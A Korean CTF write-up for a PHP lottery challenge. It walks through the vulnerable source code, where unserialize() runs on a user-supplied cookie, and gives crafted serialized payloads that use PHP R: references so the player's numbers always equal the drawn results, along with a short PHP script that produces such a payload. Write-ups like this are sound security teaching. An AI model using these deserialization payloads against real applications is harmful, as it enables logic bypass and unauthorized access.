# Keyword
- PHP Deserialization

---
# Write-UP

### 로또 당첨 시스템
- 45이하의 6개의 난수를 뽑고 사용자에게 부여하고 다시 6개의 난수를 뽑아 두개의 난수가 같은지를 체크하고, 같으면 flag를 출력해줌

- `ticket.php`를 살펴보면, `Ticket` 클래스가 정의되어 있음
```php
function draw($n, $k) {
    $ret = range(1, $n);
    for ($i = 0; $i < $n - 1; $i++) {
        $p = rand($i, $n - 1);
        [$ret[$i], $ret[$p]] = [$ret[$p], $ret[$i]];
    }
    $ret = array_slice($ret, 0, $k);
    sort($ret);
    return $ret;
}

class Ticket {
    public $results;
    public $numbers;

    function issue() {
        $this->numbers = draw(45, 6);
    }
}
```

- PHP에서 클래스를 자주 사용하는지는 잘 모르겠지만, 일반적으로 문제에서 클래스가 나오면 `PHP Deserialization` 일 확률이 높았음
- 그래서 바로 딴거 안보고 `PHP Deserialization` 취약점 위주로 분석해봤음

- `draw.php` 에서는 직렬화한 `Ticket` 데이터를 인코딩하여 `ticket` 쿠키로 설정함
```php
<?php
require('ticket.php');

$ticket_exist = false;

if (isset($_COOKIE['ticket'])) {
    $ticket_exist = true;
} else {
    $ticket = new Ticket();
    $ticket->issue();
    setcookie('ticket', base64_encode(serialize($ticket)));
}

?>
```

- `result.php`가 핵심 로직인데 여기서 유효한지 체크한 후 유효하면, 새로 6개의 난수를 뽑고 비교하고 같으면 flag를 출력해줌
```php
<?php
require('ticket.php');

$cookie_ticket = null;

if (isset($_COOKIE['ticket'])) {
    $cookie_ticket = $_COOKIE['ticket'];
    setcookie('ticket', '', time() - 1);
}

function validate($cookie_ticket) {
    if ($cookie_ticket == NULL) {
        echo "Get a ticket first!<br>";
        return;
    }

    if (!($d = base64_decode($cookie_ticket))) {
        echo "Not a valid ticket!<br>";
        return;
    }

    if (!($ticket = unserialize($d))) {
        echo "Not a valid ticket!<br>";
        return;
    }

    if (!($ticket instanceof Ticket)) {
        echo "Not a valid ticket!<br>";
        return;
    }

    if (!is_array($ticket->numbers)) {
        echo "No cheating!<br>";
        return;
    }


    $results = draw(45, 6);

    for ($i = 0; $i < 6; $i++) {
        $ticket->results[$i] = $results[$i];
    }

    $win = true;

    for ($i = 0; $i < 6; $i++) {
        if ($ticket->results[$i] !== $ticket->numbers[$i]) {
            $win = false;
        }
    }

    echo "Lucky numbers: " . implode(', ', $ticket->results) . "<br>";
    echo "Your numbers: " . implode(', ', $ticket->numbers) . "<br>";

    if ($win) {
        echo "You win! get the flag: ";
        $fp = fopen("/flag.txt", "r");
        echo fgets($fp) . "<br>";
        fclose($fp);
    } else {
        echo "Too bad.. maybe next time<br>";
    } 
}

?>
```

```php
if ($cookie_ticket == NULL) {
	echo "Get a ticket first!<br>";
	return;
}

if (!($d = base64_decode($cookie_ticket))) {
	echo "Not a valid ticket!<br>";
	return;
}

if (!($ticket = unserialize($d))) {
	echo "Not a valid ticket!<br>";
	return;
}

if (!($ticket instanceof Ticket)) {
	echo "Not a valid ticket!<br>";
	return;
}

if (!is_array($ticket->numbers)) {
	echo "No cheating!<br>";
	return;
}
```

- 1번째, 2번째는 그냥 티켓을 뽑고, 인코딩하면 됨
- 3번째부터 생각해볼 게 있는데, 일단 역직렬화 취약점을 이용하려고 하므로 새로운 어떤 객체를 넣는 것을 생각해볼 수 있음
- 그러나 4번째, 5번재에서 `Ticket` 객체를 강제하며, `Ticket` 객체의 `numbers` 프로퍼티가 배열인지를 체크하기 때문에 아래와 같은 데이터는 필터링 됨
```
O:6:"Ticket":2:{s:7:"results";N;s:7:"numbers";R:2;}
```

- 결론적으로 R을 이용한 요소 참조를 배열이 아닌 배열의 요소에 대해하게 만들어서 각각의 요소들이 각각 참조하게 만들어야 함
- 어차피 덮어씌워질 `results`객체이므로 딱히 어떤 데이터가 있든 상관없음 
```
O:6:"Ticket":2:{s:7:"results";a:6:{i:0;i:7;i:1;i:8;i:2;i:27;i:3;i:28;i:4;i:33;i:5;i:40;}s:7:"numbers";a:6:{i:0;R:3;i:1;R:4;i:2;R:5;i:3;R:6;i:4;R:7;i:5;R:8;}}
```

- 아래는 sechack님 풀이인데 코드를 사용하여 더 정상적으로 푼 것 같음
```php
<?php
class Ticket {
    public $results;
    public $numbers;

    function issue() {
        $this->numbers = draw(45, 6);
    }
}

$ticket = new Ticket();
$ticket->results = array();
$ticket->numbers = &$ticket->results;
$data = serialize($ticket);
var_dump($data);
echo base64_encode($data);
?>
```

